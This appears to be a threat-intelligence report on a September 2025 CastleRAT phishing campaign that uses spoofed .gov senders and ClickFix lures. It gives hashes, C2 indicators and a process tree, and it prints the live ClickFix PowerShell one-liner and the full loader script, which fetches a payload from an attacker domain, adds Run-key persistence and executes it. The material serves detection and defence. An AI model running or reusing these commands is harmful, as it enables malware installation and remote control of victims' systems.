@@ -1,0 +1,164 @@
+CastleRAT | 404 TDS URLs | ClickFix | ".gov" | 10 - 11 September 2025
+
+---- Email Summary ----
+
+Messages purporting to be from sender(s):
+
+- ```Nicholas Mason <Nicholas.Mason@customs.gov.bb>```
+- ```Fire Service Academy <FireService.Academy@fireservice.gov.bb>```
+- ```Hoang huy <huyH2@vinhphuc.gov.vn>```
+
+with subject(s):
+
+- Alert (5636072223): Kindly reply within 24 hours – [first name] [last name]
+
+---- Description ----
+
+These messages contain URLs which redirect users to a fake verification page. If completed, the user will be directed to a second verification page. If completed, the user will be directed to a ClickFix landing page. 
+
+ClickFix Command:
+
+```
+cmd /c powershell -w h -ep b -c "iex (iwr 'bkoifd.com/upd' -useb).Content"
+```
+
+If the ClickFix instructions are followed, a PowerShell command is initiated used to run a remote PowerShell script used to run CastleRAT.
+
+Remote PowerShell Script
+```
+try {
+    $tempDir = [Environment]::GetEnvironmentVariable("TEMP")
+    $archiveFile = "$tempDir\consa.zip"
+    $baseUrl = "bkoi" + "fd.c" + "om"
+    $downloadUrl = "https://$baseUrl/apip/f/f"
+
+    # Download operation
+    $webClient = New-Object Net.WebClient
+    $webClient.Headers["User-Agent"] = "PowerShell/5.1"
+    $webClient.DownloadFile($downloadUrl, $archiveFile)
+
+    if ([IO.File]::Exists($archiveFile)) {
+        # Extract archive contents
+        try {
+            [Reflection.Assembly]::LoadWithPartialName("System.IO.Compression.FileSystem") | Out-Null
+            [IO.Compression.ZipFile]::ExtractToDirectory($archiveFile, $tempDir)
+        } catch {
+            $shellApp = New-Object -COM Shell.Application
+            $zipFolder = $shellApp.Namespace($archiveFile)
+            $destination = $shellApp.Namespace($tempDir)
+            if ($zipFolder -ne $null) { 
+                $destination.CopyHere($zipFolder.Items(), 0x14) 
+            }
+        }
+
+        # Locate executable
+        $execPath = "$tempDir\cons.exe"
+        if (![IO.File]::Exists($execPath)) {
+            $execPath = "$tempDir\consent\cons.exe"
+        }
+        if (![IO.File]::Exists($execPath)) {
+            $foundExe = Get-ChildItem -Path $tempDir -Filter "*.exe" -Recurse -ErrorAction Ignore | Select -First 1
+            if ($foundExe) { 
+                $execPath = $foundExe.FullName 
+            }
+        }
+
+        if ([IO.File]::Exists($execPath)) {
+            # Registry persistence
+            $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+            $regName = "ConUpdate"
+            $regValue = "`"$execPath`""
+            try {
+                Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force -EA SilentlyContinue
+            } catch {}
+
+            # Execute binary
+            & $execPath
+        }
+
+        # Cleanup
+        [IO.File]::Delete($archiveFile)
+    }
+} catch {}
+```
+
+
+
+---- Example File Details ----
+
+```
+
+File Name	upd.ps1
+File Size	1931 bytes
+File Type	ASCII text
+MD5	e127fa313416579c4f064317831802b1
+SHA1	7e9d0daf1a8f1ec56c19b4758d2c0c740754c321
+SHA256	aa002834808d82b928dd623d501d26f6adecd005e4b90824f0bbee0931aa00c0
+
+File name	disco.exe
+Associated Filenames	
+C:\Users\User\AppData\Local\Temp\consent\disco.exe
+File Size	55112 bytes
+File Type	PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
+MD5	a1b55b44b51390a3df27976efb247517
+SHA1	c3986b504fb5f2984d95052030980520b776c9a6
+SHA256	81847e095e87faa5e077c9723498c9832dc89c9a84cc05f048c933aa044b8b43
+
+File name	cons.exe
+Associated Filenames	
+C:\Users\User\AppData\Local\Temp\consent\cons.exe
+File Size	112000 bytes
+File Type	PE32+ executable (GUI) x86-64, for MS Windows, 6 sections
+MD5	0b5511674394666e9d221f8681b2c2e6
+SHA1	6e4e720dfc424a12383f0b8194e4477e3bc346dc
+SHA256	ccad775decb5aec98118b381eeccc6d540928035cfb955abcb4ad3ded390b79b
+
+
+Filename	vwww8xsn.zip
+File Size	64258 bytes
+File Type	Zip archive data, at least v1.0 to extract, compression method=store
+MD5	d635d1d5d0c87c911a3c74a962a032ae
+SHA1	0df52c72774d572bc84fbe998c0ff50c4ffb9f1f
+SHA256	a9c07741f8d3afe851dd3fa80d3e5179b079bb88a776cd6a8c6100d52c2bf324
+
+File name	atlprov.dll
+Associated Filenames	
+C:\Users\User\AppData\Local\Temp\consent\atlprov.dll
+File Size	206160 bytes
+File Type	PE32+ executable (DLL) (GUI) x86-64, for MS Windows, 6 sections
+MD5	e70adbf83bc7ec8537b1f4864f8abdea
+SHA1	c787cee43679d111b813d2eddc4c85364d431f28
+SHA256	4e6e0698a25fad4755579577bd2454bda662fdba4fdf597c5f6aba1ecd829574
+
+
+File name	consa.zip
+Associated Filenames	
+C:\Users\User\AppData\Local\Temp\consa.zip
+File Size	5036789 bytes
+File Type	Zip archive data, at least v1.0 to extract, compression method=store
+MD5	29236d33201697a40042b3325414c593
+SHA1	241dd3ffbafb0d15876504710fcaaa807d2c03c8
+SHA256	59906b022adfc6f63903adbdbb64c82881e0b1664d6b7f7ee42319019fcb3d7e
+```
+
+---- Malware Configuration(s) ----
+
+CastleRAT Callback
+```
+http://www.ip-api.com/line/?fields=147457
+https://steamcommunity.com/id/krouvhsin34287f7h3
+```
+CastleRAT C2
+```
+programsbookss.com
+178.17.57.102
+```
+
+
+---- Process Tree(s) ----
+
+```
+powershell.exe 3028 -NoProfile -ExecutionPolicy bypass -File "C:\Users\User\AppData\Local\Temp\upd.ps1"
+cons.exe 1340 signed
+```
+
